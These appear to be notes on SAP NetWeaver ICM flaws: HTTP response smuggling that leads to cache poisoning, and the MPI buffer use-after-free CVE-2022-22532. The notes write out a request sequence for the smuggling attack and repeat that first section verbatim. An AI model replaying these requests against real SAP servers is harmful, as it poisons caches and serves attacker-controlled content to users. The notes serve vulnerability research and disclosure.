### Proxy Web Cache and Response Smuggling - Arbitrary Cache Poisoning

#### HTTP Requests and Responses

1. **POST Request:**
    ```http
    POST /sap/admin/public/default.html HTTP/1.1
    Host: www.SapSys.com
    Padding: {A*65KB~}
    Content-Length: 160
    ```

2. **HEAD Request:**
    ```http
    HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
    Host: www.SapSys.com
    ```

3. **GET Request (Invalid URL):**
    ```http
    GET http:///nwa HTTP/1.1
    Host: www.SapSys.com
    ```

4. **GET Request:**
    ```http
    GET /target HTTP/1.1
    Host: www.SapSys.com
    ```

5. **Response:**
    ```http
    HTTP/1.1 200 OK
    Server: SAP NetWeaver Application Server
    Content-Type: text/html
    Cache-Control: max-age=604800
    Content-Length: 3381
    ```

6. **302 Found Response:**
    ```http
    HTTP/1.1 302 Found
    Server: SAP NetWeaver Application Server
    Location: http:///webdynpro/resources/sap.com/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?home=true
    ```

#### Response Smuggling - Arbitrary Cache Poisoning

The following sequence of requests and responses can be used to demonstrate response smuggling, leading to arbitrary cache poisoning:

1. **POST Request:**
    ```http
    POST /sap/admin/public/default.html HTTP/1.1
    Host: www.SapSys.com
    Padding: {A*65KB~}
    Content-Length: 160
    ```

2. **HEAD Request:**
    ```http
    HEAD /webdynpro/welcome/Welcome.html HTTP/1.1
    Host: www.SapSys.com
    ```

3. **GET Request (Invalid URL):**
    ```http
    GET http:///nwa HTTP/1.1
    Host: www.SapSys.com
    ```

4. **GET Request:**
    ```http
    GET /target HTTP/1.1
    Host: www.SapSys.com
    ```

5. **Response:**
    ```http
    HTTP/1.1 200 OK
    Server: SAP NetWeaver Application Server
    Content-Type: text/html
    Cache-Control: max-age=604800
    Content-Length: 3381
    ```

6. **302 Found Response:**
    ```http
    HTTP/1.1 302 Found
    Server: SAP NetWeaver Application Server
    Location: http:///webdynpro/resources/sap.com/tc~lm~itsam~ui~mainframe~wd/FloorPlanApp?home=true
    ```

### MPI Buffers and HTTP Pipelining

#### Multi-Purpose Shared Memory Buffers (MPI Buffers)

- **MPI Buffers** are used to store:
  - HTTP Requests
  - HTTP Responses
  - Out-of-Bounds data

- Each worker thread has a linked list of MPI Buffer pointers (one for each purpose).

#### Example of MPI Buffers

1. **MPI Request Buffers:**
    ```http
    POST / HTTP/1.1
    GET /other HTTP/1.1
    ```

2. **ICM - HTTP Pipelining:**
    - SAP ICM Java by default accepts pipelined requests using different MPI Buffers.
    - Example:
      ```http
      GET /1 HTTP/1.1
      GET /2 HTTP/1.1
      ```

#### MPI Use After Free: CVE-2022-22532

- **Issue**: When a request is sent incomplete, the ICM will wait for more data.
  - No double CR-LF characters are found.
  - Body shorter than Message-Length header.
- **Worker Thread** is set to READ mode.
- When more data arrives, the Worker Thread writes the MPI Buffer.
- The offset of the last byte (NULL) is stored by the Worker Thread to know where to write.

#### Example of MPI Use After Free

1. **Initial Request:**
    ```http
    GET /1 HTTP/1.1
    ....66KB data
    GET /2 HTTP/1.1
    ```

2. **MPI Buffer State:**
    - MPI Buffer 1: `GET /1 HTTP/1.1`
    - MPI Buffer 2: `Body + GET /2`

3. **Handling Incomplete Requests:**
    - ICM WT is set to READ mode.
    - When more data arrives, the Worker Thread writes the MPI Buffer.
    - Offset of the last byte (NULL) is stored.

#### Smuggling without a Proxy

- **Example:**
    - ICM WT 1: `GET /1 HTTP/1.1`
    - ICM WT 2: `GET /2 HTTP/1.1`

- **MPI Buffer State:**
    - MPI Buffer 1: `GET /1 HTTP/1.1`
    - MPI Buffer 2: `Body + GET /2`

- **Error Handling:**
    - `MpiIFreeAllBuffers()` does not delete references, leading to potential use-after-free vulnerabilities.

### Conclusion

This document outlines the process of response smuggling and arbitrary cache poisoning, as well as the use of MPI Buffers in SAP ICM. It also highlights the potential security risks associated with MPI Use After Free vulnerabilities.